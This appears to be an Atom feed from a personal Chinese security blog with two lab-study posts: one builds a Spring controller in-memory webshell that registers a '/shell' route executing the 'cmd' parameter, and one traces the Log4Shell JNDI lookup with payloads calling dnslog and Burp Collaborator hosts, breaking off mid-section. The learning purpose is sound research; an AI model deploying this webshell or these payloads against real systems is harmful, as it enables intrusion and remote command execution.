<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ja9er.github.io</id>
    <title>Ja9er&apos;s Studio</title>
    <updated>2022-01-13T10:32:08.708Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ja9er.github.io"/>
    <link rel="self" href="https://ja9er.github.io/atom.xml"/>
    <subtitle>燃烧掉总比消失好</subtitle>
    <logo>https://ja9er.github.io/images/avatar.png</logo>
    <icon>https://ja9er.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Ja9er&apos;s Studio</rights>
    <entry>
        <title type="html"><![CDATA[Spring controller 内存马]]></title>
        <id>https://ja9er.github.io/post/spring-controller-nei-cun-ma/</id>
        <link href="https://ja9er.github.io/post/spring-controller-nei-cun-ma/">
        </link>
        <updated>2022-01-13T10:08:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="spring-controller-内存马学习">Spring controller 内存马学习</h1>
<blockquote>
<p><em>PS 菜鸟学习，有不正确之处还望斧正</em></p>
</blockquote>
<h2 id="0x01-开始之前">0X01 开始之前</h2>
<p>需要我们了解什么是内存马？</p>
<p>在新手阶段我们简单的将其定义为</p>
<blockquote>
<p>访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果</p>
</blockquote>
<p>思考一下在这其中的所需要实现的功能，现在来看就是两个需求</p>
<blockquote>
<ol>
<li>需要一个受控的url</li>
<li>受控的url接受传参数，且返回响应的结果</li>
</ol>
</blockquote>
<p>在解决这些需求之前，先了解一下MVC结构</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/TYIEVg"><img src="https://s4.ax1x.com/2021/12/24/TYIEVg.png" alt="TYIEVg.png" loading="lazy"></a></figure>
<p>通俗的来说，Controller就是胶水层，负责接收请求，分配给对应的逻辑层处理结果，得出结果之后响应给渲染层</p>
<p>打开靶场的源码可以看到UserController这个类，不难看出，这里注册路由，然后分配给路由对应的执行方法，这就是所谓的Controller</p>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/user&quot;)
public class UserController {
    @Autowired
    private UserService userService;
    /**
     * 注册
     * @param user 参数封装
     * @return Result
     */
    @PostMapping(value = &quot;/regist&quot;)
    public Result regist(User user){
        return userService.regist(user);
    }
    /**
     * 登录
     * @param user 参数封装
     * @return Result
     */
    @PostMapping(value = &quot;/login&quot;)
    public Result login(User user){
        return userService.login(user);
    }
}
</code></pre>
<p>所以对应的两个需求，都可以在Controller中解决。这也是被称为Spring  Controller 内存马的原因</p>
<p>面对需求我们需要做到以下三点。</p>
<blockquote>
<ol>
<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境；</li>
<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller；</li>
<li>controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果；</li>
</ol>
</blockquote>
<h2 id="0x02-调试">0x02 调试</h2>
<p>按照环境搭建靶场</p>
<p>配置一个springboot+log4j+mybits靶场</p>
<p>https://github.com/Ode1esse/springboot-login-log4j2</p>
<h3 id="0x02-01-怎么获取上下文">0X02-01 怎么获取上下文?</h3>
<blockquote>
<p>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境</p>
</blockquote>
<p>在spring中有4种方式能获得当前的上下文环境(context)，上下文可以简单理解为web端处理这个请求时，当前线程内所拥有的各种环境信息和资源。</p>
<h4 id="方法一getcurrentwebapplicationcontext"><strong>方法一</strong>：getCurrentWebApplicationContext</h4>
<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
</code></pre>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/TYIkqS"><img src="https://s4.ax1x.com/2021/12/24/TYIkqS.png" alt="TYIkqS.png" loading="lazy"></a></figure>
<p>在spring boot中无法获取</p>
<h4 id="方法二webapplicationcontextutils"><strong>方法二</strong>：WebApplicationContextUtils</h4>
<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
</code></pre>
<p><strong>拆解分析</strong></p>
<p><strong>(ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()</strong></p>
<p>在SpringMVC的源代码中提供了一个封装过的ThreadLocal，ThreadLocal就是当前线程的本地存储对象，在每个线程中都创建了一个 ThreadLocalMap 对象，每个线程可以访问自己内部 ThreadLocalMap 对象内的 value。其中保存了每次请求的HttpServletRequest对象</p>
<p>其实就是上面代码中的<strong>RequestContextHolder</strong></p>
<blockquote>
<p>RequestContextHolder：请求上下文持有者，他是通过ThreadLocal放入当前请求线程中的，通过他的静态方法getRequestAttributes可以获取到RequestAttributes，如果我们是web项目，那么他的子类就是ServletRequestAttributes。</p>
</blockquote>
<p>现在将其理解为<font color="orange">RequestContextHolder是Spring提供的可以获取HttpServletRequest的一个工具</font></p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/TYImPs"><img src="https://s4.ax1x.com/2021/12/24/TYImPs.png" alt="TYImPs.png" loading="lazy"></a></figure>
<p>通过((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()就拿到咱们的request对象了。</p>
<p><strong>RequestContextUtils.getWebApplicationContext</strong></p>
<p>拿到request对象后再来看看这个函数，顾名思义，一看就是获取Web上下文的地方</p>
<p>看看源码</p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/TYIu2q"><img src="https://s4.ax1x.com/2021/12/24/TYIu2q.png" alt="TYIu2q.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/TYInGn"><img src="https://s4.ax1x.com/2021/12/24/TYInGn.png" alt="TYInGn.png" loading="lazy"></a></figure>
<p>终于在<font color="red">request.getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE)</font>这里拿到了<code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code>的webapplicationContext。</p>
<p>DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE的值的来源是DispatcherServlet初始化的时候</p>
<pre><code class="language-java">public static final String WEB_APPLICATION_CONTEXT_ATTRIBUTE = DispatcherServlet.class.getName() + &quot;.CONTEXT&quot;;
</code></pre>
<blockquote>
<p>PS 这个函数实际已经拿到了上下文，这也就是为什么方法三能简略到方法二的原因</p>
</blockquote>
<p><strong>提出疑问，为什么能从request中获取上下文呢?</strong></p>
<p>还是要回到Spring MVC 的结构中的<code>DispatcherServlet</code></p>
<p>DispatcherServlet是spring框架实现的前端控制器。作为一个Servlet，所有的 Web 请求都需要通过它来处理，进行转发，匹配，数据处理后，并转由页面进行展现，它可以说是 SpringMVC 最核心的部分。除此之外 SpringMVC 还有不同的 HandlerMapping 映射策略，各种 Controller 控制器的实现，各种视图解析，拦截器，LocalResolver 国际化处理。</p>
<p>在完成对 ContextLoaderListener 的初始化后，Web 容器开始初始化 DispatcherServlet。 DispatcherServlet 会建立自己的上下文来持有SpringMVC的Bean 对象，过程是首先从 ServletContext 中获 取上下文作为自己的父上下文，再对自己的上下文进行初始化，最后存储到 ServletContext 中。</p>
<p>可以在下图中看到DispatcherServlet继承了FrameworkServlet</p>
<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/TYIQMV"><img src="https://s4.ax1x.com/2021/12/24/TYIQMV.png" alt="TYIQMV.png" loading="lazy"></a></figure>
<p>在FrameworkServlet中存在<strong>processRequest</strong>方法，利用该方法重写了doget(),doPost()等servlet该有的方法</p>
<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/TYIlrT"><img src="https://s4.ax1x.com/2021/12/24/TYIlrT.png" alt="TYIlrT.png" loading="lazy"></a></figure>
<p>我们可以根据processRequest方法看出:<strong>initContextHolders</strong>绑定了request和localeContext，这也就是为什么</p>
<p>request能取出上下文的原因</p>
<pre><code class="language-java">protected final void processRequest(HttpServletRequest request, HttpServletResponse response)
throws ServletException, IOException {
long startTime = System.currentTimeMillis();
Throwable failureCause = null;
//获取上一个请求保存的LocaleContext
    LocaleContext previousLocaleContext = LocaleContextHolder.getLocaleContext();
//建立新的LocaleContext
    LocaleContext localeContext = buildLocaleContext(request);
//获取上一个请求保存的RequestAttributes
    RequestAttributes previousAttributes = RequestContextHolder.getRequestAttributes();
//建立新的RequestAttributes
    ServletRequestAttributes requestAttributes = buildRequestAttributes(request, 
response, previousAttributes);
    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);
asyncManager.registerCallableInterceptor(FrameworkServlet.class.getName(), 
new RequestBindingInterceptor());
//具体设置的方法
    initContextHolders(request, localeContext, requestAttributes);
</code></pre>
<p><strong>现在来分析<code>WebApplicationContextUtils.getWebApplicationContext</code>方法源码</strong></p>
<pre><code class="language-java">//第一步
public static WebApplicationContext getWebApplicationContext(ServletContext sc) {
        return getWebApplicationContext(sc, WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
    }

//第二步
public static WebApplicationContext getWebApplicationContext(ServletContext sc, String attrName) {
        Assert.notNull(sc, &quot;ServletContext must not be null&quot;);
    	//attrName就是org.springframework.web.context.WebApplicationContext.ROOT
        Object attr = sc.getAttribute(attrName);
        if (attr == null) {
            return null;
        } else if (attr instanceof RuntimeException) {
            throw (RuntimeException)attr;
        } else if (attr instanceof Error) {
            throw (Error)attr;
        } else if (attr instanceof Exception) {
            throw new IllegalStateException((Exception)attr);
        } else if (!(attr instanceof WebApplicationContext)) {
            throw new IllegalStateException(&quot;Context attribute is not of type WebApplicationContext: &quot; + attr);
        } else {
            return (WebApplicationContext)attr;
        }
    }
</code></pre>
<p>跟进到方法内可以看到</p>
<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/TYIFr8"><img src="https://s4.ax1x.com/2021/12/24/TYIFr8.png" alt="TYIFr8.png" loading="lazy"></a></figure>
<p>该函数有两个参数,ServletContext和获取属性的字符串。ServletContext官方叫servlet上下文。JavaEE标准规定：在项目启动时，<strong>Servlet容器（Tomcat、Jboss等）<strong>需要给项目初始化一个</strong>ServletContext</strong>。作为公共环境容器存放公共信息，而ServletContext中的信息都是由容器提供的。服务器会为每一个工程创建一个对象，这个对象就是ServletContext对象。这个对象全局唯一，而且工程内部的所有servlet都共享这个对象。所以叫全局应用程序共享对象。而<font color="red">WebApplicationContext 是 SpringMVC 中对 ApplicationContext 的具体实现</font>，每个 ServletContext 下只会有一个 WebApplicationContext ，在应用初始化时就创建出来了，而不是等浏览器请求来了才创建。</p>
<p>可以在 org.springframework.web.context的 contextloader.initWebApplicationContext中观察到</p>
<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/TYIKx0"><img src="https://s4.ax1x.com/2021/12/24/TYIKx0.png" alt="TYIKx0.png" loading="lazy"></a></figure>
<p>其原理十分简单，<font color="red">在spring容器初始化的方法ContextLoader.initWebApplicationContext(ServletContext)中通过servletContext.setAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, this.context);</font>已经将WebApplicationContext的实例放入ServletContext 中了。</p>
<p>然后在工具类的WebApplicationContextUtils.getWebApplicationContext(ServletContext)方法中就可以通过传入的ServletContext参数获取到WebApplicationContext实例了。<br>
<strong>结果</strong></p>
<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/TYIiKf"><img src="https://s4.ax1x.com/2021/12/24/TYIiKf.png" alt="TYIiKf.png" loading="lazy"></a></figure>
<h4 id="方法三-requestcontextutils-是方法二的简化">方法三: RequestContextUtils 是方法二的简化</h4>
<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
</code></pre>
<p>其实在方法二中我们已经可以看到拿到request对象后已经能直接getAttribute获取上下文,实际上我们做个比较就能判断两者是否一致</p>
<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/TYI1qU"><img src="https://s4.ax1x.com/2021/12/24/TYI1qU.png" alt="TYI1qU.png" loading="lazy"></a></figure>
<h4 id="方法四-getattribute">方法四: getAttribute</h4>
<pre><code>WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
</code></pre>
<p>在上文的分析中，我们知道RequestContextHolder可以直接拿到request。</p>
<p>但是为什么呢?</p>
<p>我们接着看他的源码</p>
<pre><code class="language-java">public abstract class RequestContextHolder {
    private static final boolean jsfPresent = ClassUtils.isPresent(&quot;javax.faces.context.FacesContext&quot;, RequestContextHolder.class.getClassLoader());
    private static final ThreadLocal&lt;RequestAttributes&gt; requestAttributesHolder = new NamedThreadLocal(&quot;Request attributes&quot;);
    private static final ThreadLocal&lt;RequestAttributes&gt; inheritableRequestAttributesHolder = new NamedInheritableThreadLocal(&quot;Request context&quot;);

    public RequestContextHolder() {
    }

    public static RequestAttributes getRequestAttributes() {
        RequestAttributes attributes = (RequestAttributes)requestAttributesHolder.get();
        if (attributes == null) {
            attributes = (RequestAttributes)inheritableRequestAttributesHolder.get();
        }

        return attributes;
    }
    public static RequestAttributes currentRequestAttributes() throws IllegalStateException {
        RequestAttributes attributes = getRequestAttributes();
    ......................
</code></pre>
<p>可以看到getRequestAttributes直接从ThreadLocal取出attributes,ThreadLocal是什么不再赘述。</p>
<p>ThreadLocal的值又是来自上文分析的processRequest中的initContextHolders设置的，而实际上只要跟一下initContextHolders就可以发现塞了上下文进去，所以在这里能通过ThreadLocal取到上下文</p>
<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/TYI8ZF"><img src="https://s4.ax1x.com/2021/12/24/TYI8ZF.png" alt="TYI8ZF.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/TYIJIJ"><img src="https://s4.ax1x.com/2021/12/24/TYIJIJ.png" alt="TYIJIJ.png" loading="lazy"></a></figure>
<h3 id="0x02-02-怎么手动注册">0X02-02 怎么手动注册?</h3>
<p>还是需要先了解一下前置知识，什么是Spring  Bean</p>
<blockquote>
<ul>
<li>bean是对象，一个或者多个不限定</li>
<li>bean由Spring中一个叫IoC的东西管理</li>
<li>我们的应用程序由一个个bean构成</li>
</ul>
</blockquote>
<p>再理解一下什么叫IOC容器</p>
<blockquote>
<p>IOC容器就是具有依赖注入功能的容器，IOC容器负责实例化、定位、配置应用程序中的对象及建立这些对象间的依赖。应用程序无需直接在代码中new相关的对象，应用程序由IOC容器进行组装。在Spring中BeanFactory是IOC容器的实际代表者。</p>
</blockquote>
<p>最重要的:<font color="red">由IOC容器管理的那些组成应用程序的对象我们就叫它Bean</font>， Bean就是由Spring容器初始化、装配及管理的对象，除此之外，bean就与应用程序中的其他对象没有什么区别了。</p>
<p>可以参考下这篇文章理解</p>
<blockquote>
<p>https://www.cnblogs.com/linjiqin/archive/2013/11/04/3407126.html</p>
</blockquote>
<pre><code class="language-java">/*
如何获取IOC容器并完成我们需要的功能呢？首先应该实例化一个IOC容器，然后从容器中获取需要的对象，然后调用接口完成我们需要的功能，代码示例如下
*/
public class HelloServiceTest {
    @Test
    public void testHelloWorld() {
        // 1、读取配置文件实例化一个IOC容器
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;helloworld.xml&quot;);
        // 2、从容器中获取Bean，注意此处完全“面向接口编程，而不是面向实现”
        HelloService helloService = context.getBean(&quot;helloService&quot;, HelloService.class);
        // 3、执行业务逻辑
        helloService.sayHello();
    }
}
</code></pre>
<p>在参考文章中看到了熟悉的字眼<strong>ApplicationContext context</strong>。经过上面的学习，我们知道ApplicationContext 是容器初始化后的上下文,这里为啥跟IOC容器关联起来了呢。</p>
<p>原因如下</p>
<blockquote>
<p>在Spring IOC容器的代表就是org.springframework.beans包中的BeanFactory接口，BeanFactory接口提供了IOC容器最基本功能；而org.springframework.context包下的ApplicationContext接口扩展了BeanFactory</p>
</blockquote>
<p>这一点跟一下代码就知道了</p>
<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/TYIti9"><img src="https://s4.ax1x.com/2021/12/24/TYIti9.png" alt="TYIti9.png" loading="lazy"></a></figure>
<p>现在言归正传，我们知道在spring 中全都可以看做bean。那么我们之前静态的注册requestMapping的方法是否也可以看做一个bean呢?</p>
<p>答案是可以的。</p>
<pre><code class="language-java">// 从context中获得 RequestMappingHandlerMapping 的实例
RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
</code></pre>
<p>RequestMappingHandlerMapping对象是用于注册controller的</p>
<p>它继承了AbstractHandlerMethodMapping，在AbstractHandlerMethodMapping中提供了registerMapping方法</p>
<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/TYINGR"><img src="https://s4.ax1x.com/2021/12/24/TYINGR.png" alt="TYINGR.png" loading="lazy"></a></figure>
<p>需要三个参数</p>
<ol>
<li>
<p>mapping需要提供一个RequestMappingInfo类的实例。</p>
<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/TYIaxx"><img src="https://s4.ax1x.com/2021/12/24/TYIaxx.png" alt="TYIaxx.png" loading="lazy"></a></figure>
<p>RequestMappingInfo其实就是@RequestMapping注解里面提供信息的一个包装类，这里我们只用设置url和method</p>
<pre><code class="language-java">// 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
// 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
//注册mappinginfo信息
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
</code></pre>
</li>
<li>
<p>hanlder表示处理该url的类的实例，内存马肯定是恶意类这个类，但是如果new 这个类的话就会一直循环，所以我们可以整一个有参构造方法避免循环</p>
<pre><code class="language-java">// 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环
InjectToController injectToController = new InjectToController(&quot;aaa&quot;);
</code></pre>
</li>
<li>
<p>Method就是分配给该路由的方法，这里我们可以利用反射获取该恶意类的方法。方法里可以写任何你想要的东西</p>
<pre><code class="language-java">// 通过反射获得自定义恶意类中test的 Method 对象
Method method2 = InjectToController.class.getMethod(&quot;test&quot;);
</code></pre>
</li>
</ol>
<p>最后整合上面的信息注册:</p>
<pre><code class="language-java">mappingHandlerMapping.registerMapping(info, injectToController, method2);
</code></pre>
<h3 id="0x02-03-自定义方法回显">0x02-03 自定义方法，回显</h3>
<p>在之前其实已经谈过这个问题，目标就是获取输入并且输出。</p>
<p>所以我们需要获取当前的request和response两个对象。</p>
<p>还是可以用之前提过的RequestContextHolder这个工具类来实现，实际上在上文中我们已经利用它来获取request了</p>
<pre><code class="language-java">// 获取request和response对象
HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
</code></pre>
<p>在request中接受我们想要的参数，在java代码中执行该参数的值,这里输出response时可以用getwriter和getOutputStream</p>
<pre><code class="language-java">// 获取cmd参数并执行命令
String cmd= request.getParameter(&quot;cmd&quot;);
String res=new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
response.getOutputStream().println(res);
response.flushBuffer();
</code></pre>
<h2 id="0x03-效果演示">0X03 效果演示</h2>
<p>访问靶机/shell路径为404</p>
<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/TYIwM6"><img src="https://s4.ax1x.com/2021/12/24/TYIwM6.png" alt="TYIwM6.png" loading="lazy"></a></figure>
<p>使用靶机-log4j远程命令执行，注入恶意类</p>
<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/TYI0sK"><img src="https://s4.ax1x.com/2021/12/24/TYI0sK.png" alt="TYI0sK.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/TYIrZD"><img src="https://s4.ax1x.com/2021/12/24/TYIrZD.png" alt="TYIrZD.png" loading="lazy"></a></figure>
<p>再次访问/shell?cmd=whoami,已经得到回显</p>
<p><a href="https://imgtu.com/i/TYIsde"><img src="https://s4.ax1x.com/2021/12/24/TYIsde.png" alt="TYIsde.png" loading="lazy"></a><br>
弹个计算器试试<br>
<a href="https://imgtu.com/i/TYbOqP"><img src="https://s4.ax1x.com/2021/12/24/TYbOqP.gif" alt="TYbOqP.gif" loading="lazy"></a></p>
<h2 id="参考文章">参考文章</h2>
<blockquote>
<p>https://blog.csdn.net/x_iya/article/details/77758069 bean和webapplication</p>
<p>https://www.cnblogs.com/rancho-blog/p/7011176.html servletcontext初始化时创建webapplicationContext</p>
<p>https://blog.csdn.net/qq_42154259/article/details/107343764  求上下文持有者：RequestContextHolder</p>
<p><strong>为啥request能取出上下文</strong></p>
<p>https://blog.csdn.net/liqun_super/article/details/107999644  Spring MVC 之RequestContextHolder</p>
<p>**https://www.cnblogs.com/shuilangyizu/p/8621669.html</p>
<p>https://www.jianshu.com/p/58d3ed37a20c 什么是Spring bean</p>
<p>https://blog.csdn.net/jike11231/article/details/106229560</p>
<p>https://blog.csdn.net/weixin_44580977/article/details/103949602</p>
<p>https://blog.csdn.net/liangsheng_g/article/details/110855327</p>
<p>https://www.cnblogs.com/bitterz/p/14820898.html</p>
<p>https://www.cnblogs.com/xiaoxi/p/6164383.html</p>
<p>https://blog.csdn.net/GAMEloft9/article/details/81625348</p>
<p>https://www.cnblogs.com/chenbenbuyi/p/7470834.html</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Log4j-年轻人的第一次研究]]></title>
        <id>https://ja9er.github.io/post/log4j-nian-qing-ren-de-di-yi-ci-yan-jiu/</id>
        <link href="https://ja9er.github.io/post/log4j-nian-qing-ren-de-di-yi-ci-yan-jiu/">
        </link>
        <updated>2022-01-13T10:08:06.000Z</updated>
        <content type="html"><![CDATA[<p><strong>简单跟一下代码XD</strong></p>
<h1 id="0x01-搭建环境">0X01 搭建环境</h1>
<p>IDEA 生成maven项目，简单配置pom.xml</p>
<pre><code class="language-xml">    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
            &lt;version&gt;2.14.1&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
            &lt;version&gt;2.14.1&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;
</code></pre>
<p>生成测试类</p>
<pre><code class="language-java">import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.lookup.JndiLookup;
public class test {
    public static final Logger logger = LogManager.getLogger(test.class);
    public static void main(String[] args) {
        System.out.println(&quot;version: 2.14.1&quot;);
        logger.error(&quot;${jndi:dns://${hostName}.dnslog.cn}&quot;);
    }
}
</code></pre>
<h1 id="0x02-分析">0x02 分析</h1>
<h2 id="先问是不是再问有没有">先问是不是，再问有没有</h2>
<p>因为自己跟很麻烦(主要是因为菜...)，先剽窃一手其他师傅的结论。</p>
<p>问题点出在<code>org.apache.logging.log4j.core.lookup.JndiLookup</code></p>
<p>直接打断点</p>
<p>跟踪断点发现，在测试类中实例化logger类的过程中，</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/Tu1taj"><img src="https://s4.ax1x.com/2021/12/20/Tu1taj.png" alt="Tu1taj.png" loading="lazy"></a></figure>
<p>根据关键词建立对应类的映射关系</p>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/Tu13M8"><img src="https://s4.ax1x.com/2021/12/20/Tu13M8.png" alt="Tu13M8.png" loading="lazy"></a></figure>
<p>这是一个大前提。</p>
<p>现在回到JNDILOOKUP，直接在函数<code>lookup</code>中下断点，开始DEBUG。</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/Tu1NIs"><img src="https://s4.ax1x.com/2021/12/20/Tu1NIs.png" alt="Tu1NIs.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/Tu1ain"><img src="https://s4.ax1x.com/2021/12/20/Tu1ain.png" alt="Tu1ain.png" loading="lazy"></a></figure>
<p>可以看到IDEA很方便的给出了调用栈。其实在实际的跟踪过程中发现，红框前面的函数基本都是在套娃。没有具体的动作</p>
<p><strong>像这样</strong></p>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/Tu10zV"><img src="https://s4.ax1x.com/2021/12/20/Tu10zV.png" alt="Tu10zV.png" loading="lazy"></a></figure>
<p>随着套娃来到第一个关键点<code>MessagePatternConverter.format()</code>,我们可以看到这里官方主动判断**${**符号，进入replace函数</p>
<figure data-type="image" tabindex="6"><a href="https://imgtu.com/i/Tu1wR0"><img src="https://s4.ax1x.com/2021/12/20/Tu1wR0.png" alt="Tu1wR0.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="7"><a href="https://imgtu.com/i/Tu1dGq"><img src="https://s4.ax1x.com/2021/12/20/Tu1dGq.png" alt="Tu1dGq.png" loading="lazy"></a></figure>
<p>replace又是套娃，继续跟进到<code>StrSubstitutor.substitute()</code>,这里对传入的变量处理，剔除出额外的字符串</p>
<pre><code class="language-java">此时varNameExpr=&quot;jndi:ldap://0tubdem0sszb8wlxw9w0pmpprgx6lv.burpcollaborator.net&quot;
</code></pre>
<figure data-type="image" tabindex="8"><a href="https://imgtu.com/i/Tu1rsU"><img src="https://s4.ax1x.com/2021/12/20/Tu1rsU.png" alt="Tu1rsU.png" loading="lazy"></a></figure>
<p>然后继续处理字符串，最终把值赋给<strong>varname</strong></p>
<p>等处理过程完成后调用<code>resolveVariable</code>函数，定睛一看，诶怎么就直接冒了一个lookup出来呢?</p>
<figure data-type="image" tabindex="9"><a href="https://imgtu.com/i/Tu16Z4"><img src="https://s4.ax1x.com/2021/12/20/Tu16Z4.png" alt="Tu16Z4.png" loading="lazy"></a></figure>
<figure data-type="image" tabindex="10"><a href="https://imgtu.com/i/Tu1sLF"><img src="https://s4.ax1x.com/2021/12/20/Tu1sLF.png" alt="Tu1sLF.png" loading="lazy"></a></figure>
<h2 id="揭开谜底-jndilookup在哪里">揭开谜底--JNDILookup在哪里?</h2>
<p>原来是此时和开始初始化的内容呼应上了</p>
<p><code>getVariableResolver</code>这个函数获取的内容由<code>return this.variableResolver;</code>返回，返回的是StrSubstitutor这个类的variableResolver，而StrSubstitutor的内容又来自<code>Interpolator</code>类，也就是初始化用到的那个类，值也是之前的。</p>
<figure data-type="image" tabindex="11"><a href="https://imgtu.com/i/Tu1cdJ"><img src="https://s4.ax1x.com/2021/12/20/Tu1cdJ.png" alt="Tu1cdJ.png" loading="lazy"></a></figure>
<p>进入<code>resolver.lookup</code>可以看到，截取字符串获取前缀prefix,这里就是jndi。</p>
<figure data-type="image" tabindex="12"><a href="https://imgtu.com/i/Tu1RiR"><img src="https://s4.ax1x.com/2021/12/20/Tu1RiR.png" alt="Tu1RiR.png" loading="lazy"></a></figure>
<p><strong>jndi前缀对应JndILookup</strong>也是初始化后已经建立好的关系。</p>
<h2 id="可控的lookup变量">可控的lookup变量</h2>
<p>进入JNDILookup之后就很顺利，继续跟踪函数定位到<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>类的lookup方法.</p>
<p>到这一步其实已经豁然开朗了，当一个lookup的参数可控无过滤，我们有什么理由不认为这是个<font color='red'><strong>JNDI注入</strong></font>呢？</p>
<figure data-type="image" tabindex="13"><a href="https://imgtu.com/i/Tu1WJ1"><img src="https://s4.ax1x.com/2021/12/20/Tu1WJ1.png" alt="Tu1WJ1.png" loading="lazy"></a></figure>
<h1 id="0x03-利用">0X03 利用</h1>
<p>经过分析，可以看到这个漏洞并无什么苛刻的要求。只要是调用了log4j2的记录功能且用户可以控制输入即可。</p>
<p>简单易用，表现在实战中就是见框就插，header里面除了payload啥都没有(笑)。</p>
<p>如果想RCE，则需要先写好恶意类，再编译成class。和反序列化的利用过程一模一样。</p>
<figure data-type="image" tabindex="14"><a href="https://imgtu.com/i/Tu1IsO"><img src="https://s4.ax1x.com/2021/12/20/Tu1IsO.png" alt="Tu1IsO.png" loading="lazy"></a></figure>
<h1 id="0x04-差点什么">0X04 差点什么?</h1>
<p>麻烦的回弹shell显然没有直接执行命令且回显来的爽快。作为菜鸡也是很羡慕大佬们的操作的。那么，怎么才能把想要的结果回显到网页的中呢?</p>
<h2 id="理解什么是jndi注入">理解什么是JNDI注入?</h2>
<blockquote>
<ol>
<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；</li>
<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li>
</ol>
</blockquote>
<p>根据原理可知，JNDI注入实际上是去拉取受攻击者控制的恶意服务器上的恶意类回来动态加载。</p>
<h2 id="回显获取response和request">回显?获取response和request!</h2>
<p>根据我粗浅的开发经验，只要能拿到<code>Request</code> 和<code>Response</code>对象即可进行回显的构造，当然这也是众多方式的一种。也是目前用的较多的方式。</p>
<h2 id="实践">实践</h2>
<p>配置一个spring+log4j+mybits靶场</p>
<p>https://github.com/Ode1esse/springboot-login-log4j2</p>
<h3 id="response劫持"><strong>response劫持</strong></h3>
